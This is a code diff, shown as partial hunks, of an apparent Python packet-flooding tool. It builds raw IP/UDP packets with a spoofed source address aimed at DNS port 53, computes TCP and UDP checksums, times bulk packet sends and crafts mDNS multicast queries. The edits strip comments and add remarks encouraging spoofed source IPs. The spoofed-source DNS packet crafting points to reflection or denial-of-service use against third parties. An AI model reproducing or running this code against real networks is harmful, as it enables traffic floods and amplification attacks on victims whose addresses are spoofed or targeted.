@@ -187,7 +187,7 @@ Type:   Code:
                 print(f"Error sending packet: {e}")
 
     def tcp_checksum(self, tcp_header):
-        source_ip = socket.gethostbyname(socket.gethostname())  # Example source IP address (replace with actual source IP)
+        source_ip = socket.gethostbyname(socket.gethostname())  # Example source IP address (can be replaced with spoofed ip)
         pseudo_header = struct.pack('!4s4sBBH',
                                     socket.inet_aton(source_ip),
                                     socket.inet_aton(self.target_ip),
@@ -197,14 +197,12 @@ Type:   Code:
 
         packet = pseudo_header + tcp_header
 
-        # Calculate the checksum using one's complement arithmetic
         checksum = 0
         for i in range(0, len(packet), 2):
             checksum += (packet[i] << 8) + packet[i+1]
             if checksum > 0xFFFF:  # If the sum overflows beyond 16 bits, add the carry
                 checksum = (checksum & 0xFFFF) + 1
 
-        # Take the one's complement of the final sum
         checksum = ~checksum & 0xFFFF
 
         return checksum
@@ -247,28 +245,23 @@ Type:   Code:
         print(f"Packets sent. Elapsed time: {fn - st}s")
 
     def udp_checksum(self, source_port, dest_port, udp_length, payload):
-        # Create pseudo header
         pseudo_header = struct.pack('!HHHH', source_port, dest_port, udp_length, 0)
         pseudo_header_checksum = 0
 
-        # Calculate checksum for pseudo header
         for i in range(0, len(pseudo_header), 2):
             pseudo_header_checksum += (pseudo_header[i] << 8) + pseudo_header[i+1]
             if pseudo_header_checksum > 0xFFFF:
                 pseudo_header_checksum = (pseudo_header_checksum & 0xFFFF) + 1
 
-        # Pad the payload if its length is odd
         if len(payload) % 2 == 1:
             payload += b'\0'
 
-        # Calculate checksum for payload
         payload_checksum = 0
         for i in range(0, len(payload), 2):
             payload_checksum += (payload[i] << 8) + payload[i+1]
             if payload_checksum > 0xFFFF:
                 payload_checksum = (payload_checksum & 0xFFFF) + 1
 
-        # Calculate total checksum
         total_checksum = pseudo_header_checksum + payload_checksum
         total_checksum = (total_checksum & 0xFFFF) + (total_checksum >> 16)
         udp_checksum = ~total_checksum & 0xFFFF
@@ -296,13 +289,10 @@ Type:   Code:
         SOA (Start of Authority)	This contains administrative information about the zone
         (domains): Refers to the name of a website. e.g. google.com."""
 
-        # Create a raw socket to construct the packet
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         
-        # Construct the payload
         payload = bytes(payload, "utf-8") * size
         
-        # IP Header fields
         version = 4
         header_length = 5
         tos = 0
@@ -312,7 +302,7 @@ Type:   Code:
         ttl = 64
         protocol = socket.IPPROTO_UDP
         checksum = 0  # Kernel will fill the correct checksum
-        source_ip = self.spoofed_ip  # Use your source IP
+        source_ip = self.spoofed_ip  # Use your source IP or spoofed ip
         dest_ip = self.domain_ip(domain)
         s_port = random.randint(1024, 65535)
         d_port = 53
@@ -368,11 +358,9 @@ Type:   Code:
         SOA (Start of Authority)	This contains administrative information about the zone
         """
 
-        # Create a UDP socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        # Set the TTL for the multicast packet to 1
         ttl = struct.pack('b', 1)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
 
@@ -391,7 +379,6 @@ Type:   Code:
         dest_ip = "224.0.0.251"
         d_port = 5353
 
-        # Simple mDNS query payload
         tID = 0x0000  # Transaction ID
         flags = 0x0000  # Standard query, recursion desired
         questions = len(domains)  # Number of questions
@@ -407,7 +394,6 @@ Type:   Code:
         for domain, qtype_str in domains.items():
             qname = b''.join(struct.pack('!B', len(part)) + part.encode('utf-8') for part in domain.split('.')) + b'\x00'
             
-            # Determine the qtype
             if qtype_str == "A":
                 qtype = 0x0001
             elif qtype_str == "NS":
